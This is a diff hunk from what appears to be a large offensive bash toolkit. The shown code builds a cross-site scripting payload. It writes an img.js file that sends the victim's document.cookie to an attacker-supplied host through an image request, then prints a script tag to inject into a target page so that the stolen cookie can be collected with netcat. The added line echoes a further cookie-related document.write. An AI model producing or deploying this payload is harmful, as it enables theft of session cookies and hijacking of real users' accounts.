@@ -10810,6 +10810,7 @@ while true; do
 			read -p "(example, http://10.11.12.14): " TIP
 			if [[ "$TIP" != "" ]];
 			then
+				echo "document.write('document.cookie');"
 				echo "document.write('<img src=\"""$MIP""/?'+document.cookie+'\">');" > ./img.js
 				echo "Copy and Pate this javascript code to receive via netcat the cookie in HTTP GET response"
 				echo "<script src=\"""$TIP""/img.js\"></script>"
